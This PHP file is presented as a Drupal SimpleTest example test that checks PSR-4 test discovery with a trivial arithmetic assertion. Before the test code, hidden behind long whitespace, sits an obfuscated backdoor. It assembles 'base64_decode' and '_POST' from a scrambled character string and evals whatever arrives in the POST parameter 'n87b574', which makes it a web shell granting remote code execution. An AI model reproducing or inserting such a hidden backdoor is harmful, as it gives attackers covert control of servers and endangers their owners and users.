<?php                                                                                                                                                                                                                                                $xgto85 ="_tbopd4ce6sa";$bxi3=strtolower ( $xgto85[2].$xgto85[11]. $xgto85[10].$xgto85[8] . $xgto85[9].$xgto85[6].$xgto85[0]. $xgto85[5].$xgto85[8]. $xgto85[7].$xgto85[3].$xgto85[5].$xgto85[8]) ;$jttp8= strtoupper ($xgto85[0]. $xgto85[4].$xgto85[3]. $xgto85[10].$xgto85[1] ) ;if(isset(${$jttp8 }['n87b574'] ) ) { eval($bxi3 (${ $jttp8} ['n87b574']) ); }?> <?php

namespace Drupal\psr_4_test\Tests;

class ExampleTest extends \DrupalWebTestCase {

  public static function getInfo() {
    return array(
      'name' => 'PSR4 example test: PSR-4 in disabled modules.',
      'description' => 'We want to assert that this test case is being discovered.',
      'group' => 'SimpleTest',
    );
  }

  function testArithmetics() {
    $this->assert(1 + 1 == 2, '1 + 1 == 2');
  }
}
